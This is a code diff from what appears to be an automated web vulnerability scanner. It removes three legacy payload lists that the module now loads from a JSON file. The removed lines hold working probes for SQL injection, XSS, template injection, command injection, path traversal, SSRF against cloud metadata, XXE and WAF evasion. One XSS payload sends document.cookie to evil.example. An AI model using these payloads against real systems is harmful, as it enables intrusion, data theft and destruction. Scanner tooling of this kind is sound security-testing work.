@@ -8,118 +8,6 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 logger = logging.getLogger(__name__)
 
-# Payloads grouped by type with detection signatures
-PAYLOADS: list[dict] = [
-    # SQL Injection — error-based
-    {"type": "sqli", "payload": "'", "detect": ["sql", "sqlite", "mysql", "postgres", "syntax error", "ORA-", "unclosed quotation"]},
-    {"type": "sqli", "payload": "' OR 1=1--", "detect": ["sql"]},
-    {"type": "sqli", "payload": "1' ORDER BY 100--", "detect": ["sql", "order"]},
-    {"type": "sqli", "payload": "' UNION SELECT NULL--", "detect": ["sql"]},
-    {"type": "sqli", "payload": "1; DROP TABLE test--", "detect": ["sql"]},
-    {"type": "sqli", "payload": "' AND 1=CONVERT(int,(SELECT @@version))--", "detect": ["convert", "sql"]},
-    {"type": "sqli", "payload": "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", "detect": []},  # time-based
-    # SQL Injection — blind (response size diff)
-    {"type": "sqli_blind", "payload": "' AND '1'='1", "detect": []},
-    {"type": "sqli_blind", "payload": "' AND '1'='2", "detect": []},
-    # XSS — reflected
-    {"type": "xss", "payload": "<script>alert(1)</script>", "detect": ["<script>alert(1)</script>"]},
-    {"type": "xss", "payload": "<img src=x onerror=alert(1)>", "detect": ["onerror=alert"]},
-    {"type": "xss", "payload": "<iframe src=javascript:alert(1)>", "detect": ["<iframe"]},
-    {"type": "xss", "payload": "\"><script>alert(1)</script>", "detect": ["<script>"]},
-    {"type": "xss", "payload": "'-alert(1)-'", "detect": ["alert(1)"]},
-    {"type": "xss", "payload": "<svg onload=alert(1)>", "detect": ["<svg"]},
-    {"type": "xss", "payload": "{{7*7}}", "detect": ["49"]},  # also SSTI
-    # SSTI
-    {"type": "ssti", "payload": "${7*7}", "detect": ["49"]},
-    {"type": "ssti", "payload": "{{config}}", "detect": ["SECRET_KEY", "config"]},
-    {"type": "ssti", "payload": "<%= 7*7 %>", "detect": ["49"]},
-    {"type": "ssti", "payload": "{%import os%}{{os.popen('id').read()}}", "detect": ["uid="]},
-    # Command Injection
-    {"type": "cmdi", "payload": ";id", "detect": ["uid="]},
-    {"type": "cmdi", "payload": "|id", "detect": ["uid="]},
-    {"type": "cmdi", "payload": "`id`", "detect": ["uid="]},
-    {"type": "cmdi", "payload": "$(id)", "detect": ["uid="]},
-    {"type": "cmdi", "payload": ";cat /etc/passwd", "detect": ["root:"]},
-    # Path Traversal
-    {"type": "path_traversal", "payload": "../../etc/passwd", "detect": ["root:"]},
-    {"type": "path_traversal", "payload": "....//....//etc/passwd", "detect": ["root:"]},
-    {"type": "path_traversal", "payload": "%2e%2e%2f%2e%2e%2fetc/passwd", "detect": ["root:"]},
-    # SSRF
-    {"type": "ssrf", "payload": "http://localhost/", "detect": []},
-    {"type": "ssrf", "payload": "http://169.254.169.254/latest/meta-data/", "detect": ["ami-", "instance"]},
-    # NoSQL
-    {"type": "nosql", "payload": "{'$ne': null}", "detect": []},
-    {"type": "nosql", "payload": "[$ne]=1", "detect": []},
-    # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
-]
-
-# Round 2 — blind/time-based + second-order. Used when round 1 came up
-# clean but we still want to probe deeper. These have no obvious detect
-# string and rely on behaviour (sleep timing, boolean diff, stacked queries).
-PAYLOADS_ROUND2: list[dict] = [
-    # Time-based blind SQLi — detector is response latency, tracked
-    # in test_payload via elapsed comparison
-    {"type": "sqli_time", "payload": "' AND SLEEP(3)--", "detect": []},
-    {"type": "sqli_time", "payload": "'; WAITFOR DELAY '0:0:3'--", "detect": []},
-    {"type": "sqli_time", "payload": "' OR pg_sleep(3)--", "detect": []},
-    {"type": "sqli_time", "payload": "';select pg_sleep(3)--", "detect": []},
-    # Stacked/second-order SQLi
-    {"type": "sqli", "payload": "1); SELECT version()--", "detect": ["postgres", "mysql", "mariadb"]},
-    {"type": "sqli", "payload": "' UNION SELECT 1,@@version,3--", "detect": ["mariadb", "mysql"]},
-    {"type": "sqli", "payload": "' UNION SELECT table_name FROM information_schema.tables--", "detect": ["information_schema"]},
-    # Out-of-band / DNS exfil probe (response-based only — actual DNS
-    # exfil needs Burp Collab; here we just check if the target reflects)
-    {"type": "sqli_oob", "payload": "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@hostname),'.test.invalid\\\\a'))--", "detect": []},
-    # XSS bypass variants — handle common filters
-    {"type": "xss", "payload": "<ScRiPt>alert(1)</sCrIpT>", "detect": ["<scr"]},
-    {"type": "xss", "payload": "javascript:alert(1)", "detect": ["javascript:alert"]},
-    {"type": "xss", "payload": "<img/src='x'/onerror=alert(1)>", "detect": ["onerror"]},
-    {"type": "xss", "payload": "<a href=\"javascript:alert(1)\">x</a>", "detect": ["javascript:"]},
-    {"type": "xss", "payload": "<body onload=alert(1)>", "detect": ["onload="]},
-    # SSTI — additional engines
-    {"type": "ssti", "payload": "#{7*7}", "detect": ["49"]},           # Ruby ERB
-    {"type": "ssti", "payload": "*{7*7}", "detect": ["49"]},           # Thymeleaf
-    {"type": "ssti", "payload": "@(7*7)", "detect": ["49"]},           # Razor
-    # CRLF injection — shows up as header split
-    {"type": "crlf", "payload": "%0d%0aSet-Cookie: injected=1", "detect": []},
-    {"type": "crlf", "payload": "%0aLocation: http://evil.example/", "detect": []},
-    # XXE probe (works on XML parsers)
-    {"type": "xxe", "payload": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY y SYSTEM \"file:///etc/passwd\">]><x>&y;</x>", "detect": ["root:", "bin:"]},
-    # LDAP
-    {"type": "ldap", "payload": "*))(|(uid=*", "detect": []},
-    {"type": "ldap", "payload": "admin)(|(password=*))", "detect": []},
-]
-
-# Round 3 — WAF evasion + polyglots. Last-resort payloads used when
-# rounds 1 & 2 both came up clean. Encoding, case-mixing, polyglot
-# strings that cover multiple contexts with one payload.
-PAYLOADS_ROUND3: list[dict] = [
-    # Polyglots — single payload, multiple contexts
-    {"type": "sqli", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "detect": ["alert()"]},
-    {"type": "xss", "payload": "'\"><svg onload=alert(String.fromCharCode(88,83,83))>", "detect": ["alert(", "svg"]},
-    # URL-encoded / double-encoded
-    {"type": "sqli", "payload": "%27%20OR%201%3D1--", "detect": ["sql", "error"]},
-    {"type": "sqli", "payload": "%2527%2520OR%25201%253D1--", "detect": ["sql"]},
-    {"type": "xss", "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "detect": ["<script>"]},
-    # Unicode bypass
-    {"type": "xss", "payload": "<\u200Bscript>alert(1)</script>", "detect": ["alert"]},
-    # Comment-based WAF evasion for SQLi
-    {"type": "sqli", "payload": "'/**/OR/**/1=1--", "detect": ["sql"]},
-    {"type": "sqli", "payload": "'%0AOR%0A1=1--", "detect": ["sql"]},
-    # Null byte
-    {"type": "path_traversal", "payload": "../../etc/passwd%00.jpg", "detect": ["root:"]},
-    {"type": "path_traversal", "payload": "..;/..;/etc/passwd", "detect": ["root:"]},
-    # Command injection with encoding
-    {"type": "cmdi", "payload": "$IFS$9id", "detect": ["uid="]},
-    {"type": "cmdi", "payload": "{id,}", "detect": ["uid="]},
-    {"type": "cmdi", "payload": "id${IFS}", "detect": ["uid="]},
-    # Header injection via User-Agent/Referer style
-    {"type": "xss", "payload": "\"><img src=x onerror=fetch('//evil.example/?'+document.cookie)>", "detect": ["onerror"]},
-    # Template polyglots
-    {"type": "ssti", "payload": "{{''.__class__.__mro__[2].__subclasses__()}}", "detect": ["subclass", "class"]},
-    {"type": "ssti", "payload": "${{<%[%'\"}}%\\.", "detect": []},
-]
-
 
 def _payloads_for_round(r: int) -> list[dict]:
     """Select payload set by rotation round.
@@ -130,9 +18,6 @@ def _payloads_for_round(r: int) -> list[dict]:
     Round >=4 or <=0: union of all three (exhaustive).
 
     Payloads live in ``src/vxis/data/payloads/injection.json`` (ADR-007).
-    The ``PAYLOADS`` / ``PAYLOADS_ROUND2`` / ``PAYLOADS_ROUND3`` module
-    constants above are LEGACY — retained until the Phase 10 growth
-    pipeline rewire removes them. Do not reference them from new code.
     """
     from vxis.agent.skills._payload_loader import load_skill_payloads
     return load_skill_payloads("injection", r)
